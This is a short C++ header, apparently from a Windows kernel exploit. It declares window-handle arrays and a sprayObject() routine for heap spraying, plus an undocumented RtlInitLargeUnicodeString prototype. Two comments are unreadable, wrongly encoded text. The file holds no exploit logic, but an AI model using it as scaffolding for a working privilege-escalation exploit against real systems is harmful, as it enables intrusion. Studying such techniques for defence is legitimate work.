#ifndef SPRAY_H__
#define SPRAY_H__
#include <windows.h>
#include "assist.h"

#define hwndCount 0x300
extern "C" HWND zombiepwndPropList[hwndCount];
extern "C" HWND pwndWnd[hwndCount ];
extern "C" HWND sprayWnd_3[hwndCount];
extern "C" HWND sprayWnd_5[hwndCount];	// ����Ϊ��hook���Ķ���
extern "C" LARGE_UNICODE_STRING o1lstr, o2lstr, o3lstr, o4lstr, o5lstr;

VOID sprayObject();	// ��� ����
VOID initWindows(HWND *hwndCreate, int hwndNum);

VOID
NTAPI
RtlInitLargeUnicodeString(IN OUT PLARGE_UNICODE_STRING DestinationString,
	IN PCWSTR SourceString,
	IN INT Unknown,
	IN INT datasize );
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
#endif // !SPRAY_H__

